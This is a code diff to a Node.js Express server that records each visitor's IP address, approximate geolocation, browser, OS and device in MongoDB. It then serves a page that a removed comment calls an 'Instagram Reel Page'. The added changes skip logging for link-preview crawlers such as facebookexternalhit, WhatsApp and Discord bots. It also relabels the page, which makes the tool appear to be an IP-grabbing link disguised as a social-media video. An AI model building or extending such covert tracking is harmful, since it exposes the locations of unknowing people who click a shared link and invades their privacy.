@@ -3,11 +3,22 @@ require("dotenv").config();
 const express = require("express");
 const mongoose = require("mongoose");
 const path = require("path");
+
 const Visitor = require("./Visitor");
 
 const app = express();
 
+
+// ==========================================
+// Render Proxy
+// ==========================================
+
 app.set("trust proxy", true);
+
+
+// ==========================================
+// Port
+// ==========================================
 
 const PORT = process.env.PORT || 5000;
 
@@ -19,18 +30,24 @@ const PORT = process.env.PORT || 5000;
 mongoose
     .connect(process.env.MONGODB_URI)
     .then(() => {
-        console.log("🍃 MongoDB connected successfully!");
+
+        console.log(
+            "🍃 MongoDB connected successfully!"
+        );
+
     })
     .catch((error) => {
+
         console.error(
             "❌ MongoDB connection failed:",
             error.message
         );
+
     });
 
 
 // ==========================================
-// Frontend
+// Frontend Path
 // ==========================================
 
 const frontendPath = path.join(
@@ -39,15 +56,23 @@ const frontendPath = path.join(
     "frontend"
 );
 
+
+// ==========================================
+// Serve Frontend Files
+// ==========================================
+
 app.use(
-    express.static(frontendPath, {
-        index: false
-    })
+    express.static(
+        frontendPath,
+        {
+            index: false
+        }
+    )
 );
 
 
 // ==========================================
-// Detect Browser
+// Browser Detection
 // ==========================================
 
 function detectBrowser(userAgent) {
@@ -84,7 +109,7 @@ function detectBrowser(userAgent) {
 
 
 // ==========================================
-// Detect Operating System
+// Operating System Detection
 // ==========================================
 
 function detectOperatingSystem(userAgent) {
@@ -122,7 +147,7 @@ function detectOperatingSystem(userAgent) {
 
 
 // ==========================================
-// Detect Device Type
+// Device Detection
 // ==========================================
 
 function detectDeviceType(userAgent) {
@@ -131,7 +156,9 @@ function detectDeviceType(userAgent) {
         return "Unknown";
     }
 
-    if (/iPad|Tablet/i.test(userAgent)) {
+    if (
+        /iPad|Tablet/i.test(userAgent)
+    ) {
         return "Tablet";
     }
 
@@ -156,6 +183,7 @@ function getVisitorIP(req) {
     const forwardedFor =
         req.headers["x-forwarded-for"];
 
+
     if (forwardedFor) {
 
         return forwardedFor
@@ -164,12 +192,86 @@ function getVisitorIP(req) {
 
     }
 
+
     return req.ip;
 }
 
 
 // ==========================================
-// Get Approximate Location
+// Detect Crawlers / Bots
+// ==========================================
+
+function isCrawler(userAgent) {
+
+    if (!userAgent) {
+        return false;
+    }
+
+
+    const crawlerPatterns = [
+
+        /facebookexternalhit/i,
+
+        /facebot/i,
+
+        /googlebot/i,
+
+        /bingbot/i,
+
+        /twitterbot/i,
+
+        /linkedinbot/i,
+
+        /slackbot/i,
+
+        /telegrambot/i,
+
+        /discordbot/i,
+
+        /whatsapp/i,
+
+        /pinterest/i,
+
+        /crawler/i,
+
+        /spider/i,
+
+        /bot/i,
+
+        /headless/i
+
+    ];
+
+
+    return crawlerPatterns.some(
+        (pattern) =>
+            pattern.test(userAgent)
+    );
+}
+
+
+// ==========================================
+// Empty Location
+// ==========================================
+
+function unknownLocation() {
+
+    return {
+
+        city: "Unknown",
+
+        region: "Unknown",
+
+        country: "Unknown",
+
+        timezone: "Unknown"
+
+    };
+}
+
+
+// ==========================================
+// Approximate IP Location
 // ==========================================
 
 async function getLocation(ip) {
@@ -181,7 +283,9 @@ async function getLocation(ip) {
             ip
         );
 
+
         // Local development
+
         if (
             ip === "::1" ||
             ip === "127.0.0.1" ||
@@ -199,6 +303,7 @@ async function getLocation(ip) {
                 timezone: "Local"
 
             };
+
         }
 
 
@@ -229,17 +334,8 @@ async function getLocation(ip) {
                 response.status
             );
 
-            return {
+            return unknownLocation();
 
-                city: "Unknown",
-
-                region: "Unknown",
-
-                country: "Unknown",
-
-                timezone: "Unknown"
-
-            };
         }
 
 
@@ -256,21 +352,12 @@ async function getLocation(ip) {
         if (data.success === false) {
 
             console.log(
-                "⚠️ Location API could not identify IP:",
+                "⚠️ Location lookup failed:",
                 data.message
             );
 
-            return {
+            return unknownLocation();
 
-                city: "Unknown",
-
-                region: "Unknown",
-
-                country: "Unknown",
-
-                timezone: "Unknown"
-
-            };
         }
 
 
@@ -294,25 +381,18 @@ async function getLocation(ip) {
 
         };
 
-    } catch (error) {
+    }
+    catch (error) {
 
         console.error(
             "❌ Location lookup failed:",
             error.message
         );
 
-        return {
+        return unknownLocation();
 
-            city: "Unknown",
-
-            region: "Unknown",
-
-            country: "Unknown",
-
-            timezone: "Unknown"
-
-        };
     }
+
 }
 
 
@@ -330,7 +410,7 @@ app.get("/", async (req, res) => {
 
 
     // ==========================================
-    // Visitor Information
+    // Basic Request Information
     // ==========================================
 
     const ip =
@@ -351,7 +431,8 @@ app.get("/", async (req, res) => {
 
 
     const host =
-        req.get("Host");
+        req.get("Host") ||
+        "Unknown";
 
 
     const referrer =
@@ -360,7 +441,42 @@ app.get("/", async (req, res) => {
 
 
     // ==========================================
-    // Detect Browser / OS / Device
+    // Detect Bot
+    // ==========================================
+
+    if (isCrawler(userAgent)) {
+
+        console.log(
+            "🤖 Crawler detected:"
+        );
+
+        console.log(
+            userAgent
+        );
+
+        console.log(
+            "🚫 Visitor will NOT be saved."
+        );
+
+        console.log(
+            "-----------------------"
+        );
+
+
+        // Still give crawler the normal page
+
+        return res.sendFile(
+            path.join(
+                frontendPath,
+                "index.html"
+            )
+        );
+
+    }
+
+
+    // ==========================================
+    // Browser / OS / Device
     // ==========================================
 
     const browser =
@@ -445,7 +561,7 @@ app.get("/", async (req, res) => {
 
 
     // ==========================================
-    // Location
+    // Approximate Location
     // ==========================================
 
     const location =
@@ -464,7 +580,7 @@ app.get("/", async (req, res) => {
 
 
     // ==========================================
-    // Save Visitor to MongoDB
+    // Save Visitor
     // ==========================================
 
     try {
@@ -515,7 +631,8 @@ app.get("/", async (req, res) => {
             visitor._id
         );
 
-    } catch (error) {
+    }
+    catch (error) {
 
         console.error(
             "❌ Failed to save visitor:"
@@ -529,10 +646,10 @@ app.get("/", async (req, res) => {
 
 
     // ==========================================
-    // Send Instagram Reel Page
+    // Send Reel Page
     // ==========================================
 
-    res.sendFile(
+    return res.sendFile(
         path.join(
             frontendPath,
             "index.html"
